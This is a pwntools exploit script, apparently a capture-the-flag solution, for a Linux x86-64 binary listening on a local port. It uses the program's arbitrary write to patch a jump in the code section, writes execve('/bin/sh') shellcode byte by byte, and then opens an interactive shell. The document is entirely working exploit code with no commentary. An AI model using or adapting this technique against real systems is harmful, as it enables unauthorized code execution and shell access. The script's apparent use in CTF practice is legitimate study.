from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('127.0.0.1',10000)
text = 0x400767
    
def writeData(addr,data):
    io.sendlineafter('Where What?',hex(addr) + ' ' + str(data))
writeData(text+1,u32(asm('jnz $-0x4A')[1:].ljust(4,'\x00')))
writeData(text,u32(asm('jmp $-0x4A')[0:1].ljust(4,'\x00')))
shellcode = asm('''mov rax,0x0068732f6e69622f
                    push rax
                    mov rdi,rsp
                    mov rax,59
                    xor rsi,rsi
                    mov rdx,rdx
                    syscall
                ''')
shellcode_addr = 0x400769
i = 0
for x in shellcode:
    data = u8(x)
    writeData(shellcode_addr + i,data)
    i = i + 1
writeData(text+1,u32(asm('jnz $+0x2')[1:].ljust(4,'\x00')))
    
io.interactive()
